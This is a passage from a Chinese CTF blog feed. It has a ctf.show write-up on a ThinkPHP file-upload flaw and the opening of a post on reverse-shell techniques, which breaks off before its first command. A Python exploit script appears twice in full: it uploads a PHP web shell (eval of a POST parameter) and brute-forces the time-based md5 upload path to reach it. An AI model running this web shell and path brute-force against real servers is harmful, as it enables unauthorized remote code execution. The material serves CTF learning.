class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> pytz</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># Author:ctfshow-h1xa</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://724695db-fe75-4466-82cb-dd345f704f60.challenge.ctf.show/index.php&quot;</span></span><br><span class="line">scriptDate = <span class="string">&quot;&quot;</span></span><br><span class="line">prefix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Android&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    route = <span class="string">&quot;?url=&quot;</span> + url</span><br><span class="line">    session.get(url=url + route, headers=headers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPrefix</span>():</span><br><span class="line">    route = <span class="string">&quot;index/upload/image&quot;</span></span><br><span class="line">    file = &#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;1.php&quot;</span>, <span class="string">b&quot;&lt;?php echo &#x27;ctfshow&#x27;;eval($_POST[1]);?&gt;&quot;</span>)&#125;</span><br><span class="line">    response = session.post(url=url + route, files=file, headers=headers)</span><br><span class="line">    response_date = response.headers[<span class="string">&#x27;date&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在获取服务器时间：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response_date)</span><br><span class="line">    date_time_obj = datetime.strptime(response_date, <span class="string">&quot;%a, %d %b %Y %H:%M:%S %Z&quot;</span>)</span><br><span class="line">    date_time_obj = date_time_obj.replace(tzinfo=pytz.timezone(<span class="string">&#x27;GMT&#x27;</span>))</span><br><span class="line">    date_time_obj_gmt8 = date_time_obj.astimezone(pytz.timezone(<span class="string">&#x27;Asia/Shanghai&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在转换服务器时间：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(date_time_obj_gmt8)</span><br><span class="line">    year = date_time_obj_gmt8.year</span><br><span class="line">    month = date_time_obj_gmt8.month</span><br><span class="line">    day = date_time_obj_gmt8.day</span><br><span class="line">    hour = date_time_obj_gmt8.hour</span><br><span class="line">    minute = date_time_obj_gmt8.minute</span><br><span class="line">    second = date_time_obj_gmt8.second</span><br><span class="line">    <span class="keyword">global</span> scriptDate, prefix</span><br><span class="line">    scriptDate = <span class="built_in">str</span>(year) + <span class="built_in">str</span>(month).zfill(<span class="number">2</span>) + (<span class="built_in">str</span>(<span class="string">&quot;0&quot;</span> + <span class="built_in">str</span>(day)) <span class="keyword">if</span> day &lt; <span class="number">10</span> <span class="keyword">else</span> <span class="built_in">str</span>(day))</span><br><span class="line">    <span class="built_in">print</span>(scriptDate)</span><br><span class="line">    seconds = <span class="built_in">int</span>(date_time_obj_gmt8.timestamp())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;服务器时间：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(seconds)</span><br><span class="line">    code = <span class="string">f&#x27;&#x27;&#x27;php -r &quot;date_default_timezone_set(&#x27;Asia/Shanghai&#x27;);echo mktime(<span class="subst">&#123;hour&#125;</span>,<span class="subst">&#123;minute&#125;</span>,<span class="subst">&#123;second&#125;</span>,<span class="subst">&#123;month&#125;</span>,<span class="subst">&#123;day&#125;</span>,<span class="subst">&#123;year&#125;</span>);&quot;&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;脚本时间：&quot;</span>)</span><br><span class="line">    result = subprocess.run(code, shell=<span class="literal">True</span>, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">    script_time = <span class="built_in">int</span>(result.stdout)</span><br><span class="line">    <span class="built_in">print</span>(script_time)</span><br><span class="line">    <span class="keyword">if</span> seconds == script_time:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;时间碰撞成功，开始爆破毫秒&quot;</span>)</span><br><span class="line">        prefix = seconds</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;错误，服务器时间和脚本时间不一致&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_trailing_zero</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">if</span> num % <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(num)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        str_num = <span class="built_in">str</span>(num)</span><br><span class="line">        <span class="keyword">if</span> str_num[-<span class="number">1</span>] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> str_num[:-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkUrl</span>():</span><br><span class="line">    h = <span class="built_in">open</span>(<span class="string">&quot;url.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">global</span> scriptDate</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10000</span>):</span><br><span class="line">        target = <span class="built_in">str</span>(prefix) + <span class="string">&quot;.&quot;</span> + <span class="built_in">str</span>(i).zfill(<span class="number">4</span>)</span><br><span class="line">        target = <span class="built_in">str</span>(remove_trailing_zero(<span class="built_in">float</span>(target)))</span><br><span class="line">        <span class="comment"># target=remove_trailing_zero(target)</span></span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">        md5 = string_to_md5(target)</span><br><span class="line">        <span class="comment"># route = &quot;/uploads/&quot;+target+scriptDate+&quot;/&quot;+md5+&quot;.php&quot;</span></span><br><span class="line">        route = <span class="string">&quot;/uploads/&quot;</span> + scriptDate + <span class="string">&quot;/&quot;</span> + md5 + <span class="string">&quot;.php&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在爆破&quot;</span> + url + route)</span><br><span class="line">        response = session.get(url=url + route, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;成功getshell，地址为 &quot;</span> + url + route)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line">        h.write(route + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    h.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;爆破结束&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_md5</span>(<span class="params">string</span>):</span><br><span class="line">    md5_val = hashlib.md5(string.encode(<span class="string">&#x27;utf8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> md5_val</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    init()</span><br><span class="line">    getPrefix()</span><br><span class="line">    checkUrl()</span><br></pre></td></tr></table></figure><h1 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h1><p>先欠着哈哈哈······隔。</p>]]></content>
      
      
      <categories>
          
          <category> 脚本分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 时间碰撞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf.show之孤注一掷</title>
      <link href="/2024/08/02/ctf-show%E4%B9%8B%E5%AD%A4%E6%B3%A8%E4%B8%80%E6%8E%B7/"/>
      <url>/2024/08/02/ctf-show%E4%B9%8B%E5%AD%A4%E6%B3%A8%E4%B8%80%E6%8E%B7/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这道题值得一记，此后文章我会尽量精简。</p><h1 id="0x01-文件"><a href="#0x01-文件" class="headerlink" title="0x01 文件"></a>0x01 文件</h1><p>先不看<code>hint</code>，进题目：</p><p><img src="/./../images/posts/ctf.show%E4%B9%8B%E5%AD%A4%E6%B3%A8%E4%B8%80%E6%8E%B7/image-20240802092622600.png" alt="image-20240802092622600"></p><p>扫二维码后进入一个虚假的赌博网站，什么都干不了。</p><p>我尝试控制<code>GET</code>参数<code>url</code>，无果。现在根本没有入手点，本质上是缺乏信息，应该去寻找有用信息。</p><p>这时就应该扫目录，看看是否有留存文件。先在后台开<strong>御剑</strong>，自己试几个文件：</p><ul><li>&#x2F;robots.txt</li><li>&#x2F;.DS_Store</li><li>&#x2F;index.phps</li><li>&#x2F;.git</li><li>&#x2F;.svn</li><li>&#x2F;.index.php.swp</li></ul><p>御剑结果：</p><p><img src="/./../images/posts/ctf.show%E4%B9%8B%E5%AD%A4%E6%B3%A8%E4%B8%80%E6%8E%B7/image-20240802093734472.png" alt="image-20240802093734472"></p><p>一切信息都指向<strong><a href="http://www.zip/">www.zip</a></strong>，下载查看。</p><h1 id="0x02-源码"><a href="#0x02-源码" class="headerlink" title="0x02 源码"></a>0x02 源码</h1><p>项目框架应该是<code>ThinkPHP</code>，我经验尚缺，但是前人有提：</p><blockquote><p>审MVC框架直接看&#x2F;index&#x2F;controller下的方法</p></blockquote><p>方法如下：</p><p><img src="/./../images/posts/ctf.show%E4%B9%8B%E5%AD%A4%E6%B3%A8%E4%B8%80%E6%8E%B7/image-20240802094923145.png" alt="image-20240802094923145"></p><p>看到<code>Upload.php</code>，或许可以利用。文件源码如下：</p><p><img src="/./../images/posts/ctf.show%E4%B9%8B%E5%AD%A4%E6%B3%A8%E4%B8%80%E6%8E%B7/image-20240802095112096.png" alt="image-20240802095112096"></p><p>如果<code>file</code>为空就会报错。如果存在，上传的时候会经过复杂的命名。</p><p>我们关注这里的文件是怎么命名的，但是相关的方法溯源不了。猜想是<code>ThinkPHP</code>的内置方法，环境覆盖即可：</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">composer</span> <span class="built_in">create-project</span> <span class="string">topthink</span>/<span class="string">think</span>=<span class="string">5</span>.<span class="string">0</span>.* <span class="string">tp5</span>  <span class="built_in">--prefer-dist</span></span><br></pre></td></tr></table></figure><p>file经过<code>$info-&gt;getSaveName()</code>，溯源到最后一步：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">buildSaveName</span>(<span class="params"><span class="variable">$savename</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 自动生成文件名</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$savename</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;rule <span class="keyword">instanceof</span> \<span class="built_in">Closure</span>) &#123;</span><br><span class="line">                <span class="variable">$savename</span> = <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;rule, [<span class="variable">$this</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">switch</span> (<span class="variable language_">$this</span>-&gt;rule) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;date&#x27;</span>:</span><br><span class="line">                        <span class="variable">$savename</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Ymd&#x27;</span>) . DS . <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>));</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;rule, <span class="title function_ invoke__">hash_algos</span>())) &#123;</span><br><span class="line">                            <span class="variable">$hash</span>     = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">hash</span>(<span class="variable">$this</span>-&gt;rule);</span><br><span class="line">                            <span class="variable">$savename</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$hash</span>, <span class="number">0</span>, <span class="number">2</span>) . DS . <span class="title function_ invoke__">substr</span>(<span class="variable">$hash</span>, <span class="number">2</span>);</span><br><span class="line">                        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_callable</span>(<span class="variable">$this</span>-&gt;rule)) &#123;</span><br><span class="line">                            <span class="variable">$savename</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;rule);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="variable">$savename</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Ymd&#x27;</span>) . DS . <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>));</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="string">&#x27;&#x27;</span> === <span class="variable">$savename</span> || <span class="literal">false</span> === <span class="variable">$savename</span>) &#123;</span><br><span class="line">            <span class="variable">$savename</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getInfo</span>(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">strpos</span>(<span class="variable">$savename</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$savename</span> .= <span class="string">&#x27;.&#x27;</span> . <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getInfo</span>(<span class="string">&#x27;name&#x27;</span>), PATHINFO_EXTENSION);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$savename</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>文件名格式：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">date</span>(‘Ymd’) . DS . <span class="built_in">md5</span>(microtime(true)) . ‘.’ . <span class="built_in">pathinfo</span>($this-&gt;getInfo(‘name’), PATHINFO_EXTENSION);</span><br></pre></td></tr></table></figure><ul><li><p>保存路径：<code>url/20240723/md5</code>(精确到小数点后四位的当前时间)。</p></li><li><p>文件后缀：<code>pathinfo($this-&gt;getInfo(‘name’), PATHINFO_EXTENSION)</code>，即原上传文件的后缀。</p><ul><li>举个例子，<code>1.php</code>最后保存的文件名：<strong>md5(精确到小数点后四位的当前时间).php</strong></li></ul></li></ul><h1 id="0x03-上传"><a href="#0x03-上传" class="headerlink" title="0x03 上传"></a>0x03 上传</h1><p>可以上传文件，自然想到插马。但是文件的路径有上传时间的调控，所以我们采用脚本爆破：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> pytz</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># Author:ctfshow-h1xa</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://724695db-fe75-4466-82cb-dd345f704f60.challenge.ctf.show/index.php&quot;</span></span><br><span class="line">scriptDate = <span class="string">&quot;&quot;</span></span><br><span class="line">prefix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Android&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    route = <span class="string">&quot;?url=&quot;</span> + url</span><br><span class="line">    session.get(url=url + route, headers=headers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPrefix</span>():</span><br><span class="line">    route = <span class="string">&quot;index/upload/image&quot;</span></span><br><span class="line">    file = &#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;1.php&quot;</span>, <span class="string">b&quot;&lt;?php echo &#x27;ctfshow&#x27;;eval($_POST[1]);?&gt;&quot;</span>)&#125;</span><br><span class="line">    response = session.post(url=url + route, files=file, headers=headers)</span><br><span class="line">    response_date = response.headers[<span class="string">&#x27;date&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在获取服务器时间：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response_date)</span><br><span class="line">    date_time_obj = datetime.strptime(response_date, <span class="string">&quot;%a, %d %b %Y %H:%M:%S %Z&quot;</span>)</span><br><span class="line">    date_time_obj = date_time_obj.replace(tzinfo=pytz.timezone(<span class="string">&#x27;GMT&#x27;</span>))</span><br><span class="line">    date_time_obj_gmt8 = date_time_obj.astimezone(pytz.timezone(<span class="string">&#x27;Asia/Shanghai&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在转换服务器时间：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(date_time_obj_gmt8)</span><br><span class="line">    year = date_time_obj_gmt8.year</span><br><span class="line">    month = date_time_obj_gmt8.month</span><br><span class="line">    day = date_time_obj_gmt8.day</span><br><span class="line">    hour = date_time_obj_gmt8.hour</span><br><span class="line">    minute = date_time_obj_gmt8.minute</span><br><span class="line">    second = date_time_obj_gmt8.second</span><br><span class="line">    <span class="keyword">global</span> scriptDate, prefix</span><br><span class="line">    scriptDate = <span class="built_in">str</span>(year) + <span class="built_in">str</span>(month).zfill(<span class="number">2</span>) + (<span class="built_in">str</span>(<span class="string">&quot;0&quot;</span> + <span class="built_in">str</span>(day)) <span class="keyword">if</span> day &lt; <span class="number">10</span> <span class="keyword">else</span> <span class="built_in">str</span>(day))</span><br><span class="line">    <span class="built_in">print</span>(scriptDate)</span><br><span class="line">    seconds = <span class="built_in">int</span>(date_time_obj_gmt8.timestamp())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;服务器时间：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(seconds)</span><br><span class="line">    code = <span class="string">f&#x27;&#x27;&#x27;php -r &quot;date_default_timezone_set(&#x27;Asia/Shanghai&#x27;);echo mktime(<span class="subst">&#123;hour&#125;</span>,<span class="subst">&#123;minute&#125;</span>,<span class="subst">&#123;second&#125;</span>,<span class="subst">&#123;month&#125;</span>,<span class="subst">&#123;day&#125;</span>,<span class="subst">&#123;year&#125;</span>);&quot;&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;脚本时间：&quot;</span>)</span><br><span class="line">    result = subprocess.run(code, shell=<span class="literal">True</span>, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">    script_time = <span class="built_in">int</span>(result.stdout)</span><br><span class="line">    <span class="built_in">print</span>(script_time)</span><br><span class="line">    <span class="keyword">if</span> seconds == script_time:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;时间碰撞成功，开始爆破毫秒&quot;</span>)</span><br><span class="line">        prefix = seconds</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;错误，服务器时间和脚本时间不一致&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_trailing_zero</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">if</span> num % <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(num)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        str_num = <span class="built_in">str</span>(num)</span><br><span class="line">        <span class="keyword">if</span> str_num[-<span class="number">1</span>] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> str_num[:-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkUrl</span>():</span><br><span class="line">    h = <span class="built_in">open</span>(<span class="string">&quot;url.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">global</span> scriptDate</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10000</span>):</span><br><span class="line">        target = <span class="built_in">str</span>(prefix) + <span class="string">&quot;.&quot;</span> + <span class="built_in">str</span>(i).zfill(<span class="number">4</span>)</span><br><span class="line">        target = <span class="built_in">str</span>(remove_trailing_zero(<span class="built_in">float</span>(target)))</span><br><span class="line">        <span class="comment"># target=remove_trailing_zero(target)</span></span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">        md5 = string_to_md5(target)</span><br><span class="line">        <span class="comment"># route = &quot;/uploads/&quot;+target+scriptDate+&quot;/&quot;+md5+&quot;.php&quot;</span></span><br><span class="line">        route = <span class="string">&quot;/uploads/&quot;</span> + scriptDate + <span class="string">&quot;/&quot;</span> + md5 + <span class="string">&quot;.php&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在爆破&quot;</span> + url + route)</span><br><span class="line">        response = session.get(url=url + route, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;成功getshell，地址为 &quot;</span> + url + route)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line">        h.write(route + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    h.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;爆破结束&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_md5</span>(<span class="params">string</span>):</span><br><span class="line">    md5_val = hashlib.md5(string.encode(<span class="string">&#x27;utf8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> md5_val</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    init()</span><br><span class="line">    getPrefix()</span><br><span class="line">    checkUrl()</span><br></pre></td></tr></table></figure><p>对时间爆破脚本的详细分析在下一篇博客。</p>]]></content>
      
      
      <categories>
          
          <category> CTF题目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脚本自动化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell技法总结</title>
      <link href="/2024/08/01/%E5%8F%8D%E5%BC%B9shell%E6%8A%80%E6%B3%95%E6%80%BB%E7%BB%93/"/>
      <url>/2024/08/01/%E5%8F%8D%E5%BC%B9shell%E6%8A%80%E6%B3%95%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这几天做<code>ImaginaryCTF</code>，正好用到了<strong>反弹shell</strong>，介于对该技法的掌握并不深刻，便写下这篇博客，冀以理解原理，拓展思维。</p><h1 id="0x01-基础"><a href="#0x01-基础" class="headerlink" title="0x01 基础"></a>0x01 基础</h1><h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h2><ul><li>标准输入(stdin)：文件描述符为0，通常关联着终端键盘输入</li><li>标准输出(stdout)：文件描述符为1，通常关联着终端屏幕输出</li><li>标准错误(stderr)：文件描述符为2，通常关联着终端屏幕输出</li></ul><h2 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h2><p>假设攻击者有A服务器，攻占了受害者的B服务器。那么攻击者让A服务器去连接B服务器，即A-&gt;B，称之为正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。</p><h2 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h2><p>并不是所有情况都允许<strong>正向连接</strong>，那么什么情况下需要进行反向连接，也就是<strong>反弹sell</strong>呢？</p><blockquote><ul><li>目标机因防火墙受限，目标机器只能发送请求，不能接收请求。</li><li>目标机端口被占用。</li><li>目标机位于局域网，或IP会动态变化，攻击机无法直接连接。</li><li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。</li><li>……</li></ul></blockquote><p>举一个最简单的情况，如果你能在在前端执行系统命令，但是服务端却没有回显，那么我们是不是希望输出流不要通过服务端，而是流向我们的服务器，这就是<code>反弹sell</code>的作用：</p><p><strong>反弹shell改变了输入流和输出流，使getshell更加地灵活！</strong></p><p><code>反弹shell</code>的方法有很多，下面简单介绍几种。</p><h1 id="0x02-利用Bash反弹shell"><a href="#0x02-利用Bash反弹shell" class="headerlink" title="0x02 利用Bash反弹shell"></a>0x02 利用Bash反弹shell</h1><h2 id="基础反弹"><a href="#基础反弹" class="headerlink" title="基础反弹"></a>基础反弹</h2><p>这个方法非常简单普适，具体命令如下：</p><figure class="highlight bash"><table><tr><td 